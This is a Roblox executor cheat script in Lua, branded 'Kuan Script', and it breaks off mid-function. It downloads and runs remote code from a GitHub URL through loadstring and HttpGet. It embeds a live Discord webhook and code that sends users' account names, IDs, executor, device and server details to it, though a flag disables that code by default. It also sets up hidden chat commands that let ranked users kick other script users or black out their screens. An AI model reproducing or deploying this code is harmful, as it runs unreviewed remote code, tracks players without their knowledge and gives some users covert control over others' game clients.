local SCRIPT_BLACKLIST = {}
local BLACKLIST_FILE = "KuanScript/blacklist.txt"
local blacklistPlayers = game:GetService("Players")
local blacklistLocalPlayer = blacklistPlayers.LocalPlayer

local function loadScriptBlacklist()
    pcall(function()
        if isfile and readfile and isfile(BLACKLIST_FILE) then
            local data = readfile(BLACKLIST_FILE)
            for line in tostring(data):gmatch("[^\r\n]+") do
                local name = line:gsub("^%s+", ""):gsub("%s+$", "")
                if name ~= "" then table.insert(SCRIPT_BLACKLIST, name) end
            end
        end
    end)
end

local function saveScriptBlacklist()
    if not writefile then return false end
    local ok = pcall(function()
        if isfolder and makefolder and not isfolder("KuanScript") then makefolder("KuanScript") end
        writefile(BLACKLIST_FILE, table.concat(SCRIPT_BLACKLIST, "\n"))
    end)
    return ok
end

local function isScriptBlacklisted(name)
    local wanted = string.lower(tostring(name or ""))
    for _, blockedName in ipairs(SCRIPT_BLACKLIST) do
        if string.lower(blockedName) == wanted then return true end
    end
    return false
end

loadScriptBlacklist()
if isScriptBlacklisted(blacklistLocalPlayer.Name) then
    blacklistLocalPlayer:Kick("你已被加入款脚本黑名单，脚本已停止运行。")
    return
end

_G.KuanClickFxEnabled = _G.KuanClickFxEnabled ~= false
_G.KuanStartSoundEnabled = _G.KuanStartSoundEnabled ~= false

local success, library = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/fgyhxrtm-ship-it/gghv/refs/heads/main/%E6%96%B0UI.lua"))()
end)

if not success then
    print("欢迎使用")
    return
end

local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Lighting         = game:GetService("Lighting")
local TextChatService  = game:GetService("TextChatService")
local TweenService     = game:GetService("TweenService")
local LocalPlayer      = Players.LocalPlayer
local HttpService      = game:GetService("HttpService")
local SoundService     = game:GetService("SoundService")

local Window = nil
local START_SOUND_ID = "17687850030"
local CLICK_IMAGE_ID = "87451785636482"
local FOLDER_NAME = "KuanScript"

-- Discord监控开关：默认 false；确认使用者知情并同意后，才改为 true。
_G.KuanDiscordMonitoringEnabled = false
if _G.KuanDiscordMonitoringEnabled == true then
pcall(function()
    local _Players = game:GetService("Players")
    local _Http    = game:GetService("HttpService")
    local _UIS     = game:GetService("UserInputService")
    local _LP      = _Players.LocalPlayer
    local request  = http_request or request or HttpPost or syn.request
    if not request then return end
    local WEBHOOK = "https://discord.com/api/webhooks/1567178390375501989/uYaKB2n9VpPjhgdBgq5xQ24pY0_QyvsejQ1CDQwkMXPQ1XdWv6PgdSrpjeXY-bw4cFXa"
    local function safe(fn, fallback)
        local ok, v = pcall(fn)
        if ok and v ~= nil then return v end
        return fallback
    end
    local device = "未知设备"
    if _UIS.TouchEnabled and not _UIS.KeyboardEnabled and not _UIS.MouseEnabled then
        device = "移动设备"
    elseif not _UIS.TouchEnabled and _UIS.KeyboardEnabled and _UIS.MouseEnabled then
        device = "电脑"
    elseif _UIS.TouchEnabled and _UIS.KeyboardEnabled and _UIS.MouseEnabled then
        device = "带触摸屏的电脑"
    end
    local executor = safe(function() return identifyexecutor and identifyexecutor() or nil end, nil) or "未知"
    local userId = _LP.UserId
    local displayName = _LP.DisplayName or _LP.Name
    local avatarImage = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
    local accountAge = safe(function() return _LP.AccountAge .. " 天" end, "未知")
    local placeName = safe(function() return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end, "未知地图")
    local timeStr = os.date("%Y-%m-%d %H:%M:%S")
    local msg = {
        ["username"] = "款脚本记录",
        ["embeds"] = {{
            ["color"] = 0x32CD32,
            ["title"] = "通用脚本监控-有人正在使用 " .. os.date("%H") .. "时" .. os.date("%M") .. "分",
            ["thumbnail"] = { ["url"] = avatarImage },
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
            ["fields"] = {
                { ["name"] = "用户名", ["value"] = tostring(_LP.Name), ["inline"] = true },
                { ["name"] = "名称", ["value"] = tostring(displayName), ["inline"] = true },
                { ["name"] = "UserId", ["value"] = tostring(userId), ["inline"] = true },
                { ["name"] = "地图名称", ["value"] = tostring(placeName), ["inline"] = true },
                { ["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                { ["name"] = "JobId", ["value"] = tostring(game.JobId), ["inline"] = true },
                { ["name"] = "使用的注入器", ["value"] = tostring(executor), ["inline"] = true },
                { ["name"] = "账号年龄", ["value"] = tostring(accountAge), ["inline"] = true },
                { ["name"] = "设备", ["value"] = tostring(device), ["inline"] = true },
            },
            ["footer"] = { ["text"] = "款脚本 · " .. timeStr }
        }}
    }
    request({ Url = WEBHOOK, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = _Http:JSONEncode(msg) })
end)
end -- KuanDiscordMonitoringEnabled

local function PlayStartSound()
    if _G.KuanStartSoundEnabled == false then return end
    pcall(function()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://" .. START_SOUND_ID
        s.Volume = 0.5
        s.Parent = SoundService
        s:Play()
        task.delay(2, function() if s then s:Destroy() end end)
    end)
end

UserInputService.InputBegan:Connect(function(input)
    if _G.KuanClickFxEnabled == false then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        local pg = LocalPlayer:WaitForChild("PlayerGui")
        local screen = pg:FindFirstChild("ClickPointGui")
        if not screen then
            screen = Instance.new("ScreenGui")
            screen.Name = "ClickPointGui"
            screen.ResetOnSpawn = false
            screen.IgnoreGuiInset = true
            screen.DisplayOrder = 10000
            screen.Parent = pg
        end
        local point = Instance.new("ImageLabel")
        point.Size = UDim2.new(0, 30, 0, 30)
        point.AnchorPoint = Vector2.new(0.5, 0.5)
        point.Position = UDim2.new(0, input.Position.X, 0, input.Position.Y)
        point.BackgroundTransparency = 1
        point.Image = "rbxassetid://" .. CLICK_IMAGE_ID
        point.Parent = screen
        Instance.new("UICorner", point).CornerRadius = UDim.new(1, 0)
        TweenService:Create(point, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, 60, 0, 60),
            ImageTransparency = 1
        }):Play()
        task.delay(0.6, function() point:Destroy() end)
    end
end)

local ScriptUsers = { [LocalPlayer.Name] = true }
_G.KuanScriptUsers = ScriptUsers
_G.KuanRefreshTags = nil

local ADMIN_LIST   = { "huwen97", "KuaishouKuan2", "mj_676711451467", "XHZY_SHZYZJ",   "thmost1", "WUyangXxX", "sysy78NB", "aa1360051" }
-- 权限名单同步自“踢人黑屏黑名单版”：作者 3、测试官 2、测试人员 1
local AUTHOR_LIST = {
    "fuhgtdtfftxrvfhf",
    "dhjhcxgjk",
}
local TEST_OFFICER_LIST = {
    "ctyccttvyvv",
    "Noobplayer4523XD",
    "wR1P84",
}
local TESTER_LIST = {
    "huwen97",
    "KuaishouKuan2",
    "mj_676711451467",
    "XHZY_SHZYZJ",
    "thmost1",
    "WUyangXxX",
    "sysy78NB",
    "aa1360051",
}

local function inList(list, name)
    local wanted = string.lower(tostring(name or ""))
    for _, v in ipairs(list) do
        if string.lower(v) == wanted then return true end
    end
    return false
end

local function getRank(name)
    if inList(AUTHOR_LIST, name) then return 3 end
    if inList(TEST_OFFICER_LIST, name) then return 2 end
    if inList(TESTER_LIST, name) then return 1 end
    return 0
end

local function isAdmin(name)  return getRank(name) >= 1 end
local function isTester(name) return getRank(name) == 2 end
local function isAuthor(name) return getRank(name) == 3 end
local function isInAnyList(name) return getRank(name) >= 1 end

local selfRole
if isAuthor(LocalPlayer.Name) then selfRole = "款脚本作者"
elseif isTester(LocalPlayer.Name) then selfRole = "测试官"
elseif isAdmin(LocalPlayer.Name) then selfRole = "测试人员"
else selfRole = "款脚本用户" end
local activeTags = {}
local showHeadTagEnabled = true
local showOtherTagsEnabled = false
local allowLowRankTagsEnabled = false
local restrictLowRankTagEffects = false -- 仅限制本地看到的低等级头衔特效
local tagBackgroundEnabled = false -- 默认关闭头衔背景图片
local tagShimmerEnabled = true
local tagVerticalShakeEnabled = false
local tagHorizontalShakeEnabled = false

-- 纯客户端只能读取游戏服务器已复制给客户端的标记。
-- 只有服务器明确将目标玩家标记为 KuanScriptActive=true，才视为已启动款脚本。
-- 同时要求目标等级严格低于本地玩家；未标记、同级或更高级玩家均不显示。
local function canSeeTag(myPlayer, targetPlayer)
    if not myPlayer or not targetPlayer then return false end
    if targetPlayer == myPlayer then return true end
    if not showOtherTagsEnabled then return false end
    if getRank(myPlayer.Name) < 1 then return false end
    if getRank(targetPlayer.Name) >= getRank(myPlayer.Name) then return false end

    local activeOk, isScriptActive = pcall(function()
        return targetPlayer:GetAttribute("KuanScriptActive")
    end)
    if not activeOk or isScriptActive ~= true then return false end

    return true
end

local function createTag(player)
    if not showHeadTagEnabled then return end
    if not player or not player.Character then return end
    if not canSeeTag(LocalPlayer, player) then return end
    if activeTags[player] then return end
    local head = player.Character:FindFirstChild("Head")
    if not head then return end

    local rank = getRank(player.Name)
    local mainTitle = "款脚本用户"
    if rank == 3 then mainTitle = "款脚本作者"
    elseif rank == 2 then mainTitle = "测试官"
    elseif rank == 1 then mainTitle = "测试人员" end

    local billboard = Instance.new("BillboardGui")
    billboard.Name = "KuanAuthorTag"
    billboard.Size = UDim2.new(0, 185, 0, 52)
    billboard.StudsOffset = Vector3.new(0, 1.4, 0)
    billboard.AlwaysOnTop = true
    billboard.Parent = head

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(10, 5, 16)
    bg.BackgroundTransparency = 0
    bg.BorderSizePixel = 0
    bg.Parent = billboard
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = bg

    -- 头衔框专用背景图：只限制在原有 185x52 头衔框内，不覆盖主界面
    local tagBackgroundImage = Instance.new("ImageLabel")
    tagBackgroundImage.Name = "TagBackgroundImage"
    tagBackgroundImage.Size = UDim2.new(1, 0, 1, 0)
    tagBackgroundImage.Position = UDim2.new(0, 0, 0, 0)
    tagBackgroundImage.BackgroundTransparency = 1
    tagBackgroundImage.BorderSizePixel = 0
    tagBackgroundImage.Image = "rbxassetid://76786845799745"
    tagBackgroundImage.ImageTransparency = 0.10
    tagBackgroundImage.ScaleType = Enum.ScaleType.Crop
    tagBackgroundImage.Visible = tagBackgroundEnabled
    tagBackgroundImage.ZIndex = 1
    tagBackgroundImage.Parent = bg
    local tagBackgroundCorner = Instance.new("UICorner")
    tagBackgroundCorner.CornerRadius = UDim.new(0, 10)
    tagBackgroundCorner.Parent = tagBackgroundImage

    -- 按目标玩家身份分配专属头衔配色
    -- 作者：青蓝-紫色渐变；测试官：紫色；测试人员：青色；普通脚本用户：白色
    local gradStart, gradEnd
    if rank == 3 then
        gradStart = Color3.fromRGB(0, 220, 255)
        gradEnd   = Color3.fromRGB(200, 0, 255)
    elseif rank == 2 then
        gradStart = Color3.fromRGB(190, 100, 255)
        gradEnd   = Color3.fromRGB(105, 35, 210)
    elseif rank == 1 then
        gradStart = Color3.fromRGB(0, 220, 255)
        gradEnd   = Color3.fromRGB(0, 145, 210)
    else
        gradStart = Color3.fromRGB(255, 255, 255)
        gradEnd   = Color3.fromRGB(220, 225, 235)
    end

    local strokeOuter = Instance.new("UIStroke")
    strokeOuter.Color = Color3.fromRGB(255, 255, 255)
    strokeOuter.Thickness = 2.5
    strokeOuter.Transparency = 0
    strokeOuter.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    strokeOuter.Parent = bg
    local strokeOuterGrad = Instance.new("UIGradient")
    strokeOuterGrad.Color = ColorSequence.new(gradStart, gradEnd)
    strokeOuterGrad.Rotation = 45
    strokeOuterGrad.Parent = strokeOuter

    local innerBorder = Instance.new("Frame")
    innerBorder.Size = UDim2.new(1, -4, 1, -4)
    innerBorder.Position = UDim2.new(0, 2, 0, 2)
    innerBorder.BackgroundTransparency = 1
    innerBorder.BorderSizePixel = 0
    innerBorder.Parent = bg
    local innerCorner = Instance.new("UICorner")
    innerCorner.CornerRadius = UDim.new(0, 8)
    innerCorner.Parent = innerBorder

    local strokeInner = Instance.new("UIStroke")
    strokeInner.Color = Color3.fromRGB(255, 255, 255)
    strokeInner.Thickness = 1
    strokeInner.Transparency = 0.2
    strokeInner.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    strokeInner.Parent = innerBorder
    local strokeInnerGrad = Instance.new("UIGradient")
    strokeInnerGrad.Color = ColorSequence.new(gradStart, gradEnd)
    strokeInnerGrad.Rotation = -45
    strokeInnerGrad.Parent = strokeInner

    local sideBar = Instance.new("Frame")
    sideBar.Size = UDim2.new(0, 2, 1, -16)
    sideBar.Position = UDim2.new(0, 6, 0, 8)
    sideBar.BorderSizePixel = 0
    sideBar.Parent = bg
    local sideBarCorner = Instance.new("UICorner")
    sideBarCorner.CornerRadius = UDim.new(1, 0)
    sideBarCorner.Parent = sideBar
    local sideBarGrad = Instance.new("UIGradient")
    sideBarGrad.Color = ColorSequence.new(gradStart, gradEnd)
    sideBarGrad.Rotation = 90
    sideBarGrad.Parent = sideBar

    local avatarHolder = Instance.new("Frame")
    avatarHolder.Size = UDim2.new(0, 34, 0, 34)
    avatarHolder.Position = UDim2.new(0, 12, 0.5, -17)
    avatarHolder.BackgroundTransparency = 1
    avatarHolder.ZIndex = 3
    avatarHolder.Parent = bg

    local avatar = Instance.new("ImageLabel")
    avatar.Size = UDim2.new(1, 0, 1, 0)
    avatar.BackgroundColor3 = Color3.fromRGB(20, 15, 30)
    avatar.BorderSizePixel = 0
    avatar.ZIndex = 3
    avatar.Image = "rbxthumb://type=AvatarHeadShot&id=" .. tostring(player.UserId) .. "&w=100&h=100"
    avatar.Parent = avatarHolder
    -- 通过 Roblox 缩略图 API 再取一次头像，避免 rbxthumb 地址未及时解析时头像空白。
    task.spawn(function()
        local thumbOk, thumbUrl = pcall(function()
            local content, _isReady = Players:GetUserThumbnailAsync(
                player.UserId,
                Enum.ThumbnailType.HeadShot,
                Enum.ThumbnailSize.Size100x100
            )
            return content
        end)
        if thumbOk and thumbUrl and avatar and avatar.Parent then
            avatar.Image = thumbUrl
        end
    end)
    local avatarCorner = Instance.new("UICorner")
    avatarCorner.CornerRadius = UDim.new(1, 0)
    avatarCorner.Parent = avatar

    local avatarStroke = Instance.new("UIStroke")
    avatarStroke.Color = Color3.fromRGB(255, 255, 255)
    avatarStroke.Thickness = 2
    avatarStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    avatarStroke.Parent = avatar
    local avatarStrokeGrad = Instance.new("UIGradient")
    avatarStrokeGrad.Color = ColorSequence.new(gradStart, gradEnd)
    avatarStrokeGrad.Rotation = 45
    avatarStrokeGrad.Parent = avatarStroke

    local textContainer = Instance.new("Frame")
    textContainer.Size = UDim2.new(1, -60, 1, 0)
    textContainer.Position = UDim2.new(0, 56, 0, 0)
    textContainer.BackgroundTransparency = 1
    textContainer.ZIndex = 3
    textContainer.Parent = bg

    local roleText = Instance.new("TextLabel")
    roleText.Size = UDim2.new(1, 0, 0, 12)
    roleText.Position = UDim2.new(0, 0, 0, 6)
    roleText.BackgroundTransparency = 1
    roleText.ZIndex = 3
    roleText.Text = "KUAN SCRIPT USER"
    roleText.TextColor3 = gradStart
    roleText.TextSize = 8
    roleText.Font = Enum.Font.GothamBold
    roleText.TextXAlignment = Enum.TextXAlignment.Left
    roleText.Parent = textContainer

    local mainTitleText = Instance.new("TextLabel")
    mainTitleText.Size = UDim2.new(1, 0, 0, 18)
    mainTitleText.Position = UDim2.new(0, 0, 0, 17)
    mainTitleText.BackgroundTransparency = 1
    mainTitleText.ZIndex = 3
    mainTitleText.Text = mainTitle
    mainTitleText.TextColor3 = Color3.fromRGB(255, 255, 255)
    mainTitleText.TextSize = 13
    mainTitleText.Font = Enum.Font.GothamBold
    mainTitleText.TextXAlignment = Enum.TextXAlignment.Left
    mainTitleText.Parent = textContainer

    local subText = Instance.new("TextLabel")
    subText.Size = UDim2.new(1, 0, 0, 12)
    subText.Position = UDim2.new(0, 0, 1, -14)
    subText.BackgroundTransparency = 1
    subText.ZIndex = 3
    subText.Text = player.Name .. "  ONLINE"
    subText.TextColor3 = Color3.fromRGB(180, 160, 220)
    subText.TextSize = 9
    subText.Font = Enum.Font.GothamMedium
    subText.TextXAlignment = Enum.TextXAlignment.Left
    subText.Parent = textContainer

    local dotHolder = Instance.new("Frame")
    dotHolder.Size = UDim2.new(0, 16, 0, 16)
    dotHolder.Position = UDim2.new(1, -24, 0.5, -8)
    dotHolder.BackgroundTransparency = 1
    dotHolder.ZIndex = 3
    dotHolder.Parent = bg

    local dotOuter = Instance.new("Frame")
    dotOuter.Size = UDim2.new(1, 0, 1, 0)
    dotOuter.BackgroundTransparency = 1
    dotOuter.Parent = dotHolder
    local dotOuterCorner = Instance.new("UICorner")
    dotOuterCorner.CornerRadius = UDim.new(1, 0)
    dotOuterCorner.Parent = dotOuter

    local dotOuterStroke = Instance.new("UIStroke")
    dotOuterStroke.Color = Color3.fromRGB(255, 255, 255)
    dotOuterStroke.Thickness = 1
    dotOuterStroke.Transparency = 0.3
    dotOuterStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    dotOuterStroke.Parent = dotOuter
    local dotOuterGrad = Instance.new("UIGradient")
    dotOuterGrad.Color = ColorSequence.new(gradStart, gradEnd)
    dotOuterGrad.Parent = dotOuterStroke

    local dotInner = Instance.new("Frame")
    dotInner.Size = UDim2.new(0, 6, 0, 6)
    dotInner.Position = UDim2.new(0.5, -3, 0.5, -3)
    dotInner.BorderSizePixel = 0
    dotInner.Parent = dotHolder
    local dotInnerCorner = Instance.new("UICorner")
    dotInnerCorner.CornerRadius = UDim.new(1, 0)
    dotInnerCorner.Parent = dotInner
    local dotInnerGrad = Instance.new("UIGradient")
    dotInnerGrad.Color = ColorSequence.new(gradStart, gradEnd)
    dotInnerGrad.Parent = dotInner

    local baseTagOffset = Vector3.new(0, 1.4, 0)
    local tagPhase = math.random() * math.pi * 2
    local rotConnection
    rotConnection = RunService.RenderStepped:Connect(function()
        if not billboard.Parent then
            rotConnection:Disconnect()
            return
        end
        local lowRankEffectsBlocked = restrictLowRankTagEffects and rank == 0
        if tagShimmerEnabled and rank == 3 and not lowRankEffectsBlocked then
            strokeOuterGrad.Rotation = (strokeOuterGrad.Rotation + 1) % 360
            strokeInnerGrad.Rotation = (strokeInnerGrad.Rotation - 1) % 360
            avatarStrokeGrad.Rotation = (avatarStrokeGrad.Rotation + 1) % 360
        end
        local t = tick() * 2 + tagPhase
        local dx = (tagHorizontalShakeEnabled and not lowRankEffectsBlocked) and math.cos(t) * 0.045 or 0
        local dy = (tagVerticalShakeEnabled and not lowRankEffectsBlocked) and math.sin(t) * 0.045 or 0
        billboard.StudsOffset = baseTagOffset + Vector3.new(dx, dy, 0)
    end)

    task.spawn(function()
        while activeTags[player] and dotInner.Parent do
            TweenService:Create(dotInner, TweenInfo.new(1.2), {BackgroundTransparency = 0.8}):Play()
            task.wait(1.2)
            TweenService:Create(dotInner, TweenInfo.new(1.2), {BackgroundTransparency = 0}):Play()
            task.wait(1.2)
        end
    end)

    activeTags[player] = billboard
end

local function clearTag(player)
    if activeTags[player] then activeTags[player]:Destroy() activeTags[player] = nil end
end

local function refreshAllTags()
    for player in pairs(activeTags) do clearTag(player) end
    for _, player in ipairs(Players:GetPlayers()) do
        createTag(player)
    end
end
_G.KuanRefreshTags = refreshAllTags

-- 低等级玩家加入时：如果本地玩家等级更高，则在本地聊天框欢迎该玩家。
-- 例如作者会欢迎测试官/测试人员/普通用户；测试官会欢迎测试人员/普通用户。
local welcomedJoiners = {}

local function showChatWelcome(player)
    local welcomeText = "欢迎 " .. player.Name .. " 加入游戏！"

    task.spawn(function()
        -- 新版聊天系统：等待 RBXGeneral 频道就绪后发送本地系统消息。
        for _ = 1, 20 do
            local displayed = false
            pcall(function()
                if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                    local channels = TextChatService:FindFirstChild("TextChannels")
                    local channel = channels and (
                        channels:FindFirstChild("RBXGeneral")
                        or channels:FindFirstChildWhichIsA("TextChannel")
                    )
                    if channel then
                        channel:DisplaySystemMessage(welcomeText)
                        displayed = true
                    end
                else
                    -- 旧版聊天系统：系统消息直接显示在聊天窗口。
                    game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
                        Text = welcomeText,
                        Color = Color3.fromRGB(120, 255, 150),
                        Font = Enum.Font.SourceSansBold,
                        TextSize = 18
                    })
                    displayed = true
                end
            end)
            if displayed then return end
            task.wait(0.5)
        end

        warn("[款脚本] 聊天欢迎消息发送失败：" .. player.Name)
    end)
end

local function showRankWelcomeMessage(player)
    if not player or player == LocalPlayer then return end

    local joiningRank = getRank(player.Name)
    local localRank = getRank(LocalPlayer.Name)

    -- 只欢迎比自己等级低的加入者；同级或更高级玩家不触发。
    if joiningRank >= localRank then return end
    if welcomedJoiners[player.UserId] then return end
    welcomedJoiners[player.UserId] = true

    showChatWelcome(player)
end

local function onPlayerJoin(player)
    showRankWelcomeMessage(player)

    task.spawn(function()
        local char = player.Character or player.CharacterAdded:Wait()
        local head = char:WaitForChild("Head", 5)
        if head then
            task.wait(0.1)
            createTag(player)
        end
    end)
    player.CharacterAdded:Connect(function()
        clearTag(player)
        task.wait(0.5)
        createTag(player)
    end)
    player.CharacterRemoving:Connect(function() clearTag(player) end)
end

Players.PlayerAdded:Connect(onPlayerJoin)
for _, player in ipairs(Players:GetPlayers()) do
    task.spawn(function()
        onPlayerJoin(player)
    end)
end
Players.PlayerRemoving:Connect(function(player)
    welcomedJoiners[player.UserId] = nil
    clearTag(player)
end)

-- 仅测试官和作者可在聊天中输入“开/关”切换其他脚本用户头衔。
local function handleTagVisibilityCommand(message)
    if getRank(LocalPlayer.Name) < 2 then return end
    local command = tostring(message or ""):gsub("^%s+", ""):gsub("%s+$", "")
    if command == "开" then
        showOtherTagsEnabled = true
        allowLowRankTagsEnabled = true
        refreshAllTags()
    elseif command == "关" then
        showOtherTagsEnabled = false
        allowLowRankTagsEnabled = false
        refreshAllTags()
    end
end
pcall(function()
    LocalPlayer.Chatted:Connect(handleTagVisibilityCommand)
end)
pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        if message.TextSource and message.TextSource.UserId == LocalPlayer.UserId then
            handleTagVisibilityCommand(message.Text)
        end
    end)
end)

-- 请求离开协议：通过 Roblox 聊天频道向目标发送请求。
-- 接收方也必须运行包含本协议的脚本；其客户端会校验请求者等级后自行退出。
local LEAVE_REQUEST_PREFIX = "[KUAN_LEAVE_REQUEST]"
pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        local source = message.TextSource
        if not source or source.UserId == LocalPlayer.UserId then return end
        local text = tostring(message.Text or "")
        if text:sub(1, #LEAVE_REQUEST_PREFIX) ~= LEAVE_REQUEST_PREFIX then return end
        local targetId, senderId = text:sub(#LEAVE_REQUEST_PREFIX + 1):match("^(%d+):(%d+)$")
        if not targetId or tonumber(targetId) ~= LocalPlayer.UserId then return end
        if tonumber(senderId) ~= source.UserId then return end
        local sender = Players:GetPlayerByUserId(source.UserId)
        if not sender then return end
        local senderRank = getRank(sender.Name)
        local myRank = getRank(LocalPlayer.Name)
        if senderRank < 2 or senderRank <= myRank then return end
        LocalPlayer:Kick("你已接受 " .. sender.Name .. " 发出的离开游戏请求。")
    end)
end)

-- 黑屏/恢复协议：只改变接收方自己的客户端画面；接收方需运行配套脚本。
local BLACKOUT_REQUEST_PREFIX = "[KUAN_BLACKOUT]"
local RESTORE_REQUEST_PREFIX = "[KUAN_RESTORE]"
local blackoutGui = nil
local function setLocalBlackout(enabled)
    local playerGui = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
    if enabled then
        if blackoutGui and blackoutGui.Parent then return end
        blackoutGui = Instance.new("ScreenGui")
        blackoutGui.Name = "KuanScriptBlackout"
        blackoutGui.IgnoreGuiInset = true
        blackoutGui.DisplayOrder = 1000000
        blackoutGui.ResetOnSpawn = false
        local frame = Instance.new("Frame")
        frame.Name = "Blackout"
        frame.Size = UDim2.fromScale(1, 1)
        frame.Position = UDim2.fromScale(0, 0)
        frame.BackgroundColor3 = Color3.new(0, 0, 0)
        frame.BorderSizePixel = 0
        frame.Parent = blackoutGui
        blackoutGui.Parent = playerGui
    elseif blackoutGui then
        blackoutGui:Destroy()
        blackoutGui = nil
    end
end

pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        local source = message.TextSource
        if not source or source.UserId == LocalPlayer.UserId then return end
        local text = tostring(message.Text or "")
        local prefix, enabled
        if text:sub(1, #BLACKOUT_REQUEST_PREFIX) == BLACKOUT_REQUEST_PREFIX then
            prefix, enabled = BLACKOUT_REQUEST_PREFIX, true
        elseif text:sub(1, #RESTORE_REQUEST_PREFIX) == RESTORE_REQUEST_PREFIX then
            prefix, enabled = RESTORE_REQUEST_PREFIX, false
        else
            return
        end
        local targetId, senderId = text:sub(#prefix + 1):match("^(%d+):(%d+)$")
        if not targetId or tonumber(targetId) ~= LocalPlayer.UserId or tonumber(senderId) ~= source.UserId then return end
        local sender = Players:GetPlayerByUserId(source.UserId)
        if not sender then return end
        local senderRank, myRank = getRank(sender.Name), getRank(LocalPlayer.Name)
        if senderRank < 2 or senderRank <= myRank then return end
        setLocalBlackout(enabled)
    end)
end)

local voidProtectEnabled = false
local voidPositions = {}
local voidConn = nil

local function updateVoidProtection()
    if voidProtectEnabled then
        if not voidConn then
            voidConn = RunService.Heartbeat:Connect(function()
                local char = LocalPlayer.Character
                if not char then return end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if not hrp then return end
                table.insert(voidPositions, { time = tick(), position = hrp.Position })
                while #voidPositions > 0 and voidPositions[1].time < tick() - 3 do
                    table.remove(voidPositions, 1)
                end
                if hrp.Position.Y < -100 then
                    if #voidPositions > 0 then
                        hrp.CFrame = CFrame.new(voidPositions[1].position)
                    end
                end
            end)
        end
    else
        if voidConn then voidConn:Disconnect(); voidConn = nil end
        voidPositions = {}
    end
end

LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.5)
    voidPositions = {}
    if voidProtectEnabled then
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            table.insert(voidPositions, { time = tick(), position = hrp.Position })
        end
    end
end)

local danmakuTrackCount = 8
local currentTrack = 1
local danmakuTrackY = {}
for i = 1, danmakuTrackCount do
    danmakuTrackY[i] = 0.1 + (i - 1) * 0.06
end

local function CreateDanmaku(text)
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local gui = Instance.new("ScreenGui")
    gui.Name = "DanmakuGui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 999
    gui.Parent = playerGui

    local track = currentTrack
    currentTrack = (currentTrack % danmakuTrackCount) + 1
    local yPos = danmakuTrackY[track]

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0, 0, 0, 30)
    bg.Position = UDim2.new(1, 0, yPos, 0)
    bg.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    bg.BackgroundTransparency = 0.2
    bg.Parent = gui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(1, 0)
    corner.Parent = bg
    local stroke = Instance.new("UIStroke")

    if text == "你是我的！" then
        stroke.Color = Color3.fromRGB(255, 0, 0)
    else
        stroke.Color = Color3.fromRGB(0, 200, 255)
    end

    stroke.Thickness = 1
    stroke.Transparency = 0.5
    stroke.Parent = bg

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -20, 1, 0)
    label.Position = UDim2.new(0, 10, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.fromRGB(255, 255, 255)
    label.TextSize = 15
    label.Font = Enum.Font.GothamBold
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = bg

    local textWidth = (#text * 16) + 40
    bg.Size = UDim2.new(0, textWidth, 0, 30)

    local tween = TweenService:Create(bg, TweenInfo.new(8, Enum.EasingStyle.Linear), {Position = UDim2.new(0, -textWidth, yPos, 0)})
    tween:Play()
    tween.Completed:Connect(function() gui:Destroy() end)
end

local function CreateHorrorDanmaku(text)
    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
    local gui = Instance.new("ScreenGui")
    gui.Name = "HorrorDanmakuGui"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 9999
    gui.IgnoreGuiInset = true
    gui.Parent = playerGui

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(0, 0, 0, 50)
    bg.Position = UDim2.new(1, 0, math.random(10, 80)/100, 0)
    bg.BackgroundColor3 = Color3.fromRGB(15, 0, 0)
    bg.BackgroundTransparency = 0.2
    bg.BorderSizePixel = 0
    bg.Parent = gui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 5)
    corner.Parent = bg

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(255, 0, 0)
    stroke.Thickness = 2
    stroke.Transparency = 0.3
    stroke.Parent = bg

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, -20, 1, 0)
    label.Position = UDim2.new(0, 10, 0, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.fromRGB(255, 0, 0)
    label.TextSize = 28
    label.Font = Enum.Font.Creepster
    label.TextXAlignment = Enum.TextXAlignment.Left
    label.Parent = bg

    local textWidth = (#text * 28) + 60
    bg.Size = UDim2.new(0, textWidth, 0, 50)

    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://1653988824"
    sound.Volume = 1
